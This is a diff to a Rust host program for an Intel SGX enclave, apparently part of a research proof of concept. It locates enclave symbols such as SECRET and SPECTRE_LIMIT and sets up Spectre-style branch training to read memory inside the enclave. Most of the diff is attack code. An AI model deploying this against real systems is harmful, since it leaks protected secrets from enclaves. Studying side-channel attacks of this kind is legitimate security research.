@@ -15,6 +15,7 @@
 // specific language governing permissions and limitations
 // under the License..
 
+#![feature(asm)]
 use std::num::Wrapping;
 
 extern crate sgx_types;
@@ -32,7 +33,7 @@ extern crate nix;
 use nix::sys::mman::{mmap, mprotect, MapFlags, ProtFlags};
 
 extern crate libc;
-use libc::c_void;
+use libc::{c_void, exit};
 
 static ENCLAVE_FILE: &'static str = "enclave1.signed.so";
 
@@ -136,9 +137,12 @@ fn main() -> std::io::Result<()> {
 
     let mut minidow_secret_sym = goblin::elf::Sym::default();
     let mut secret_sym = goblin::elf::Sym::default();
+    let mut spectre_limit_sym = goblin::elf::Sym::default();
+    /*
     let mut jb_offset = 0;
     let mut jb_dst_addr = 0;
     let mut ret_offset = 0;
+    */
     let mut spectre_test_offset = 0;
     let mut spectre_test_size = 0;
 
@@ -148,10 +152,13 @@ fn main() -> std::io::Result<()> {
             minidow_secret_sym = sym;
         } else if symbol_name == "SECRET" {
             secret_sym = sym;
+        } else if symbol_name == "SPECTRE_LIMIT" {
+            spectre_limit_sym = sym;
         } else if symbol_name == "access_memory_spectre" {
             spectre_test_offset = sym.st_value as usize;
             spectre_test_size = sym.st_size as usize;
 
+            /*
             let asm_code =
                 &enclave_binary[spectre_test_offset..spectre_test_offset + spectre_test_size];
 
@@ -179,8 +186,15 @@ fn main() -> std::io::Result<()> {
                     break;
                 }
             }
+            */
         }
     }
+
+    /*
+    println!("ret_offset: 0x{:x}", ret_offset);
+    println!("jb_offset: 0x{:x}", jb_offset);
+    println!("jb_dst_addr: 0x{:x}", jb_dst_addr);
+    */
 
     println!("spectre_test_offset: 0x{:x}", spectre_test_offset);
 
@@ -225,12 +239,17 @@ fn main() -> std::io::Result<()> {
                 ..(data_offset_file + minidow_secret_sym.st_value as i64 + 8) as usize]
                 as *const _ as *const usize)
         };
+
     let minidow_secret_array_addr_in_enclave =
-        minidow_secret_array_addr as i64 - top_32bit_offset as i64;
+        minidow_secret_array_addr as i64 + top_32bit_offset as i64;
     println!(
         "Minidow_secret adress inside the enclave: {:x}",
         minidow_secret_array_addr_in_enclave
     );
+
+    let spectre_limit_addr = top_32bit_offset as usize
+        + mapped_array as *const _ as usize
+        + spectre_limit_sym.st_value as usize;
 
     let spectre_test_training_fun: unsafe extern "C" fn(
         measurement_array_addr: usize,
@@ -275,27 +294,39 @@ fn main() -> std::io::Result<()> {
         std::mem::transmute(dst_addr)
     };
 
-    let target = (Wrapping(secret_sym.st_value as usize)
-        - Wrapping(minidow_secret_array_addr_in_enclave as usize + 64))
-    .0;
-    println!("target_offset: 0x{:x}", target);
+    // yay, training is now possible!
+    setup_measurements();
 
     unsafe extern "C" fn spectre_test_ecall(base_addr: usize, off: usize) {
+        //*((base_addr + minidow::MULTIPLE_OFFSET) as *mut u8) = 123;
+        //asm!(
+        //    "xor rax, rax",
+        //    "mov eax, $2",
+        //    "mov rbx, $0",
+        //    "mov rcx, $0",
+        //    "enclu"
+        //);
         let result = Enclave1_spectre_test(ENCLAVE.geteid(), base_addr as u64, off as u64);
         if result != sgx_status_t::SGX_SUCCESS {
             println!("[-] ECALL Enclave Failed: {}!", result.as_str());
         }
     }
+    /*
+    let target = (Wrapping(secret_sym.st_value as usize)
+        - Wrapping(minidow_secret_array_addr_in_enclave as usize + 64))
+    .0;
+    */
+    let target = minidow_secret_array_addr_in_enclave as usize + 64;
+    println!("target: 0x{:x}", target);
 
-    setup_measurements();
-
-    // yay, training is now possible!
-    let spectre = Spectre::new(Some(spectre_test_training_fun), Some(spectre_test_ecall));
+    let spectre = Spectre::new(
+        Some(spectre_test_training_fun),
+        Some(spectre_test_ecall),
+        Some((minidow_secret_array_addr_in_enclave as usize + 64) as *const i8),
+        Some(spectre_limit_addr as *const u8),
+    );
     println!("0x{:x}", minidow::read_ptr(&spectre, || {}, target));
-
-    println!("ret_offset: 0x{:x}", ret_offset);
-    println!("jb_offset: 0x{:x}", jb_offset);
-    println!("jb_dst_addr: 0x{:x}", jb_dst_addr);
+    println!("{:p}", unsafe { minidow::BASE_ADDR as *const u8 });
 
     unsafe {
         std::mem::take(&mut ENCLAVE).destroy();
